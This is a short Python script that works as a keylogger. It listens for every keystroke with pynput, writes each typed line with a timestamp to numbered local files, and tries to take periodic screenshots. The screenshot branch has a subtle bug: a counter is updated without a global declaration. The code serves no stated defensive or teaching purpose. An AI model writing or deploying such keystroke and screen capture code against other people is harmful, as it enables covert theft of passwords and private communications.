from pynput import keyboard
from pyautogui import screenshot as s
import os
import time

hasil = []
fileUrut = 1
timeInit = time.strftime("%S")
fotoUrut = 100

os.system("cls")

def on_press(key):
    global hasil
    try:
        hasil.append(key.char)

        if(int(timeInit) % 3 == 0):
                s("{}.jpg".format(fotoUrut))
                fotoUrut += 1

    except AttributeError:
        if(key == keyboard.Key.enter):
            hasil.append("\n")
        elif(key == keyboard.Key.backspace):
            hasil = hasil[:-1]
        elif(key == keyboard.Key.space):
            hasil.append(" ")
        else: 
            hasil.append(" [{}] ".format(str(key)))


def on_release(key):        
    global hasil
    global fileUrut
    global timeInit
    # r"hasil-{}.txt".format(str(file))
    if(key == keyboard.Key.enter):
        # print("{} => ".format(time.strftime("%Y-%m-%d %H:%M:%S")),end='')
        with open(str(fileUrut), "a") as file:
            file.write("{} => ".format(time.strftime("%Y-%m-%d %H:%M:%S")))  
            for x in range(len(hasil)):
                # print(hasil[x]  ,end='')
                file.write(hasil[x])
            hasil = []
            file.close()

        # with open(str(fileUrut), "r") as fileRead:
        fileRead = open(str(fileUrut), "r")
        lines = fileRead.readlines()
        fileRead.close()
        
        if(len(lines) >= 5):
            fileUrut += 1
            
    elif(key == keyboard.Key.delete):
            return False


with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


